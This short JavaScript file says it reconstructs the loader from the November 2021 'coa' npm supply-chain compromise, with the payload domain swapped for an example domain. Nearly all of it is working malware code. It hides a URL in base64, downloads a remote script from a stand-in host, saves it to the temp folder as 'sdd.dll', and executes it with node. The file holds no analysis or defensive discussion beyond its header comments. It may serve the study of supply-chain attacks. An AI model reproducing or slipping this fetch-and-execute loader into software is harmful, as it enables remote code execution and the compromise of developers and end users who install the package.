// Reconstructed from the November 2021 coa compromise
// The original downloaded an obfuscated payload from pastorcryptograph.at
// All URLs replaced with safe example domains.

const https = require('https');
const os = require('os');
const fs = require('fs');
const { exec } = require('child_process');

const encoded = Buffer.from('aHR0cHM6Ly9wYXN0b3JjcnlwdG9ncmFwaC5leGFtcGxlLmNvbS9wYXlsb2FkLmpz', 'base64').toString();

https.get(encoded, (resp) => {
  let data = '';
  resp.on('data', (chunk) => { data += chunk; });
  resp.on('end', () => {
    const tmpFile = os.tmpdir() + '/sdd.dll';
    fs.writeFileSync(tmpFile, data);
    exec('node ' + tmpFile);
  });
});
